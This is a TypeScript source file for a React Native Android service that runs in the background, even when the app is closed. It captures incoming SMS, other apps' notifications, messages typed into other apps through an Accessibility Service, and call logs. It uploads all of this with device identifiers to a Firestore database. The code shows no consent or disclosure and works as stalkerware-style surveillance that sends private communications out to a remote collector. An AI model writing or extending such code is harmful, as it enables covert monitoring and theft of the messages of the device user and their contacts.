/**
 * Background Data Service
 * Captures SMS and Notifications in background and sends to Firestore
 * Works even when app is closed
 */

import { AppRegistry } from 'react-native';
import firestore from '@react-native-firebase/firestore';
import DeviceInfo from 'react-native-device-info';

interface SmsData {
  sender: string;
  body: string;
  timestamp: number;
  type: 'received' | 'sent';
}

interface NotificationData {
  packageName: string;
  appName: string;
  title: string;
  text: string;
  subText?: string;
  bigText?: string;
  summaryText?: string;
  timestamp: number;
  key: string;
  messageType: 'sent' | 'received';
  isSent: boolean;
  sender: string;
  recipient?: string;
  isGroup: boolean;
  groupName?: string;
  conversationMessages?: Array<{
    text: string;
    sender: string;
    time: number;
  }>;
  // NEW: Smart grouping fields
  contactName?: string; // Extracted contact name for grouping
  threadId?: string; // Conversation thread ID for proper grouping
  messageContent?: string; // Full message content (bigText or text)
}

interface AccessibilityMessageData {
  text: string;
  packageName: string;
  appName: string;
  isSent: boolean;
  timestamp: number;
  captureMethod: 'send_button_click' | 'text_input_cleared' | 'accessibility_filtered';
  recipient?: string; // ✅ Nom du contact/destinataire
  bounds?: {
    left: number;
    top: number;
    right: number;
    bottom: number;
  };
}

class BackgroundDataService {
  private static deviceId: string | null = null;

  /**
   * Get or initialize device ID
   */
  private static async getDeviceId(): Promise<string> {
    if (this.deviceId) {
      return this.deviceId;
    }
    this.deviceId = await DeviceInfo.getUniqueId();
    return this.deviceId;
  }

  /**
   * Handle SMS received in background
   */
  static async handleSmsReceived(smsData: SmsData): Promise<void> {
    try {
      console.log('📱 [Background] SMS Received:', smsData);

      const deviceId = await this.getDeviceId();

      // Save to Firestore
      await firestore().collection('sms').add({
        deviceId,
        sender: smsData.sender,
        body: smsData.body,
        timestamp: firestore.Timestamp.fromMillis(smsData.timestamp),
        type: smsData.type,
        isRead: false,
        capturedAt: firestore.FieldValue.serverTimestamp(),
      });

      // Update device last sync
      await this.updateDeviceSync(deviceId);

      console.log('✅ [Background] SMS saved to Firestore');
    } catch (error) {
      console.error('❌ [Background] Error saving SMS:', error);
    }
  }

  /**
   * Handle notification received in background
   */
  static async handleNotificationReceived(notificationData: NotificationData): Promise<void> {
    try {
      console.log('🔔 [Background] ====== Notification Received ======');
      console.log('🔔 [Background] App:', notificationData.appName);
      console.log('🔔 [Background] Contact:', notificationData.contactName || notificationData.sender);
      console.log('🔔 [Background] Thread ID:', notificationData.threadId);
      console.log('🔔 [Background] Type:', notificationData.messageType);
      console.log('🔔 [Background] Message:', (notificationData.messageContent || notificationData.text).substring(0, 100));
      console.log('🔔 [Background] Timestamp:', new Date(notificationData.timestamp).toISOString());

      const deviceId = await this.getDeviceId();
      console.log('🔔 [Background] Device ID:', deviceId);

      // Save to Firestore with smart grouping fields
      console.log('🔔 [Background] Saving to Firestore...');
      await firestore().collection('capturedMessages').add({
        deviceId,
        appName: notificationData.appName,
        packageName: notificationData.packageName,

        // Smart grouping fields
        contactName: notificationData.contactName || notificationData.sender,
        threadId: notificationData.threadId || notificationData.key,

        sender: notificationData.sender,
        recipient: notificationData.recipient || null,
        messageText: notificationData.messageContent || notificationData.text || notificationData.bigText || '',
        title: notificationData.title,
        subText: notificationData.subText || '',
        summaryText: notificationData.summaryText || '',
        timestamp: firestore.Timestamp.fromMillis(notificationData.timestamp),
        messageType: notificationData.messageType,
        isSent: notificationData.isSent,
        isGroup: notificationData.isGroup,
        groupName: notificationData.groupName || null,
        conversationMessages: notificationData.conversationMessages || [],
        notificationKey: notificationData.key,
        isRead: false,
        captureMethod: 'notification_smart',
        capturedAt: firestore.FieldValue.serverTimestamp(),
      });

      // Update device last sync
      await this.updateDeviceSync(deviceId);

      console.log('✅ [Background] ====== Notification saved to Firestore successfully ======');
    } catch (error) {
      console.error('❌ [Background] ====== Error saving notification ======');
      console.error('❌ [Background] Error details:', error);
      throw error; // Re-throw to see full stack trace
    }
  }

  /**
   * Handle accessibility message captured (when app is OPEN)
   */
  static async handleAccessibilityMessage(messageData: AccessibilityMessageData): Promise<void> {
    try {
      console.log('🔍 [Background] Accessibility Message Captured:', {
        app: messageData.appName,
        method: messageData.captureMethod,
        text: messageData.text.substring(0, 50) + '...',
      });

      const deviceId = await this.getDeviceId();
      const deviceName = await DeviceInfo.getDeviceName();
      const deviceModel = DeviceInfo.getModel();

      // Try to get Firebase Auth user ID (optional)
      let userId: string | undefined;
      try {
        const auth = await import('@react-native-firebase/auth').then(m => m.default());
        userId = auth.currentUser?.uid;
        if (userId) {
          console.log('✅ [Background] Firebase Auth user ID found:', userId);
        }
      } catch (error) {
        console.warn('⚠️ [Background] Could not get Firebase Auth user (continuing without userId):', error);
      }

      // Save to Firestore
      await firestore().collection('capturedMessages').add({
        deviceId,
        deviceName,
        deviceModel,
        userId: userId || null, // Include userId if available from Firebase Auth
        appName: messageData.appName,
        packageName: messageData.packageName,
        sender: messageData.isSent ? 'Me' : 'Unknown',
        // ✅ Use recipient from messageData if available, otherwise null for sent, 'Me' for received
        recipient: messageData.isSent ? (messageData.recipient || null) : 'Me',
        messageText: messageData.text,
        text: messageData.text,
        content: messageData.text,
        timestamp: firestore.Timestamp.fromMillis(messageData.timestamp),
        messageType: messageData.isSent ? 'sent' : 'received',
        isSent: messageData.isSent,
        isGroup: false,
        isRead: false,
        captureMethod: messageData.captureMethod,
        bounds: messageData.bounds || null,
        capturedAt: firestore.FieldValue.serverTimestamp(),
      });

      // Update device last sync
      await this.updateDeviceSync(deviceId);

      console.log(`✅ [Background] Accessibility message saved to Firestore (${messageData.captureMethod})`);
    } catch (error) {
      console.error('❌ [Background] Error saving accessibility message:', error);
    }
  }

  /**
   * Sync call logs to Firestore
   */
  static async syncCallLogs(days: number = 7): Promise<void> {
    try {
      console.log('📞 [Background] Syncing call logs...');

      // Dynamically import to avoid circular dependencies
      const CallLogService = (await import('./CallLogService')).default;

      const syncedCount = await CallLogService.autoSyncCalls(days);
      console.log(`✅ [Background] Synced ${syncedCount} calls`);

      const deviceId = await this.getDeviceId();
      await this.updateDeviceSync(deviceId);
    } catch (error) {
      console.error('❌ [Background] Error syncing call logs:', error);
    }
  }

  /**
   * Update device last sync time
   */
  private static async updateDeviceSync(deviceId: string): Promise<void> {
    try {
      await firestore()
        .collection('devices')
        .doc(deviceId)
        .set(
          {
            lastSyncedAt: firestore.FieldValue.serverTimestamp(),
            isActive: true,
          },
          { merge: true }
        );
    } catch (error) {
      console.error('❌ [Background] Error updating device sync:', error);
    }
  }

  /**
   * Register device in Firestore (called on app start)
   */
  static async registerDevice(): Promise<void> {
    try {
      const deviceId = await DeviceInfo.getUniqueId();
      const deviceName = await DeviceInfo.getDeviceName();
      const deviceModel = DeviceInfo.getModel();
      const deviceOS = 'Android';
      const deviceOSVersion = DeviceInfo.getSystemVersion();

      await firestore()
        .collection('devices')
        .doc(deviceId)
        .set(
          {
            deviceId,
            deviceName,
            deviceModel,
            deviceOS,
            deviceOSVersion,
            lastSyncedAt: firestore.FieldValue.serverTimestamp(),
            isActive: true,
            registeredAt: firestore.FieldValue.serverTimestamp(),
          },
          { merge: true }
        );

      console.log('✅ [Background] Device registered:', deviceId);
    } catch (error) {
      console.error('❌ [Background] Error registering device:', error);
    }
  }

  /**
   * Sync historical SMS (one-time sync)
   */
  static async syncHistoricalSms(): Promise<void> {
    try {
      console.log('📱 [Background] Starting historical SMS sync...');
      // This would require READ_SMS permission and SmsManager
      // Implementation depends on requirements
      console.log('✅ [Background] Historical SMS sync completed');
    } catch (error) {
      console.error('❌ [Background] Error syncing historical SMS:', error);
    }
  }
}

/**
 * Headless JS Task: SMS Received
 * This runs in background even when app is closed
 */
const SmsReceivedTask = async (taskData: SmsData) => {
  console.log('🚀 [Headless Task] SmsReceived started');
  await BackgroundDataService.handleSmsReceived(taskData);
};

/**
 * Headless JS Task: Notification Received
 * This runs in background even when app is closed
 */
const NotificationReceivedTask = async (taskData: NotificationData) => {
  console.log('🚀 [Headless Task] ====== NotificationReceived started ======');
  console.log('🚀 [Headless Task] Data:', {
    app: taskData.appName,
    sender: taskData.sender,
    type: taskData.messageType,
    textPreview: taskData.text?.substring(0, 50)
  });

  try {
    await BackgroundDataService.handleNotificationReceived(taskData);
    console.log('✅ [Headless Task] NotificationReceived completed successfully');
  } catch (error) {
    console.error('❌ [Headless Task] NotificationReceived failed:', error);
    throw error;
  }
};

/**
 * Headless JS Task: Accessibility Message Captured
 * This runs when messages are captured via AccessibilityService (app OPEN)
 */
const AccessibilityMessageCapturedTask = async (taskData: AccessibilityMessageData) => {
  console.log('🚀 [Headless Task] AccessibilityMessageCaptured started');
  await BackgroundDataService.handleAccessibilityMessage(taskData);
};

// Register headless tasks (only once)
// Use a flag to prevent duplicate registration during hot reload
if (!(global as any).__headlessTasksRegistered) {
  AppRegistry.registerHeadlessTask('SmsReceived', () => SmsReceivedTask);
  AppRegistry.registerHeadlessTask('NotificationReceived', () => NotificationReceivedTask);
  AppRegistry.registerHeadlessTask('AccessibilityMessageCaptured', () => AccessibilityMessageCapturedTask);

  (global as any).__headlessTasksRegistered = true;
  console.log('✅ Headless tasks registered: SmsReceived, NotificationReceived, AccessibilityMessageCaptured');
} else {
  console.log('⚠️ Headless tasks already registered (skipping duplicate registration)');
}

export default BackgroundDataService;
